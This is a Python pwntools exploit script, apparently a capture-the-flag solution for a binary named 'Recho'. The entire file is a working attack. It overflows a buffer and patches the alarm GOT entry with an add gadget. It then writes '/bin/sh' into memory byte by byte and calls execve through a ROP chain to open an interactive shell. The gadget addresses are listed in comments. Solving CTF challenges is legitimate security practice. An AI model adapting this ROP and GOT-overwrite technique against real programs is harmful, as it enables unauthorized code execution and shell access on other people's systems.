from pwn import *


def rechosend(r: remote, lenth: int, data: bytes):
    r.sendline(str(lenth))
    r.sendline(data)


context.log_level = "debug"
r = process("./Recho")
elf = ELF("./Recho")

pop_rax = 0x4006fc
pop_rdi = 0x4008a3
pop_rsi_r15 = 0x4008a1
pop_rdx = 0x4006fe
add_rdi = 0x40070d
bin_sh_addr = 0x601500

r.recvuntil("Welcome to Recho server!\n")
# rechosend(r, 1, b"1")
payload = cyclic(0x38)
payload += p64(pop_rdi) + p64(elf.got["alarm"])
payload += p64(pop_rax) + p64(0x9)
payload += p64(add_rdi)
for i in range(7):
    payload += p64(pop_rdi) + p64(bin_sh_addr + i)
    payload += p64(pop_rax) + p64(ord("/bin/sh"[i]))
    payload += p64(add_rdi)
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bin_sh_addr)
payload += p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(elf.plt["alarm"])
print(len(payload))
rechosend(r, 0x200, payload.ljust(0x200, b"\x00"))
r.shutdown("send")
r.interactive()
# 0x000000000040070d: add byte ptr [rdi], al; ret;
# 0x00000000004006fc: pop rax; ret;
# 0x00000000004008a3: pop rdi; ret;
# 0x00000000004006fe: pop rdx; ret;
# 0x00000000004008a1: pop rsi; pop r15; ret;